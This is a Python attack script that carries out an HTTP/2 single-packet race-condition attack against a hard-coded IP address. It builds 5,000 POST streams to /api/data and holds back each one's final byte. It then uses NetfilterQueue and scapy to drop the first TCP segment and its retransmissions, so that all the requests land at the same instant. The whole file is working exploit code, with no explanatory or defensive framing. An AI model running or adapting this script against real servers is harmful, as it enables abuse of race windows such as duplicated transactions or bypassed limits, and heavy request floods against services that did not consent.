from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP
import time
import threading
    
headers = """POST / HTTP/2
Host: 34.176.35.249
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Accept: text/html
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 18"""

body = """a=1234567890"""

host = "34.176.35.249"
port = 443
try_num = 5_000

intercept = False
end = False
count = 0
first_packet_seq = -1

def process_packet(pkt):
    raw = pkt.get_payload()
    ip_pkt = IP(raw)

    if ip_pkt.haslayer(TCP):
        
        global count
        tcp = ip_pkt[TCP]
        print(f"[+] TCP Packet: {ip_pkt.src}:{tcp.sport} -> {ip_pkt.dst}:{tcp.dport} : {len(tcp.payload)} : {count} : {tcp.seq} ", end="")
        count += 1
        if (not intercept):
            count -= 1
            pkt.accept()
            print()
            return
        
        global first_packet_seq
        if tcp.seq == first_packet_seq:
            if end == False:
                print("DROPPED FIRST PACKET RETRANSMISSION")
                pkt.drop()
                return
            else:
                pkt.accept()
                print("ACCEPTED FIRST PACKET RETRANSMISSION")
                return
        
        if end == True:
            pkt.drop()
            print("DROPPED")
            return

        if (count == 1):
            print("TCP SEGMENT #1")
            first_packet_seq = tcp.seq
            pkt.drop()
            return

    print()
    pkt.accept()
        


nfqueue = NetfilterQueue()

nfqueue.bind(0, process_packet)

threading.Thread(
    target=nfqueue.run,
    daemon=True
).start()

h2_conn = H2OnTlsConnection(hostname=host, port_number=port)

h2_conn.setup_connection()

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

header_and_data_frames = (
    []
)
last_byte_data = []

for i in range(0, try_num):
    last_data_frame_with_last_byte = ""
    header_and_data_frames_without_last_byte, last_data_frame_with_last_byte = (
        h2_conn.create_single_packet_http2_post_request_frames(
            method="POST",
            headers_string=headers,
            scheme="https",
            stream_id=stream_ids_list[i],
            authority=host,
            body=body,
            path="/api/data",
        )
    )

    header_and_data_frames.append(header_and_data_frames_without_last_byte)
    last_byte_data.append(last_data_frame_with_last_byte)


data_bytes = b""
for h in header_and_data_frames:
    data_bytes += bytes(h)

last_byte_bytes = b""
for d in last_byte_data:
    last_byte_bytes += bytes(d)

h2_conn.send_bytes(data_bytes)

print("Sending incomplete data...")
time.sleep(5)
intercept = True
h2_conn.send_bytes(last_byte_bytes)
print("Sending last byte packets...")
time.sleep(5)
end = True
    

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

sleep(3)

h2_conn.close_connection()
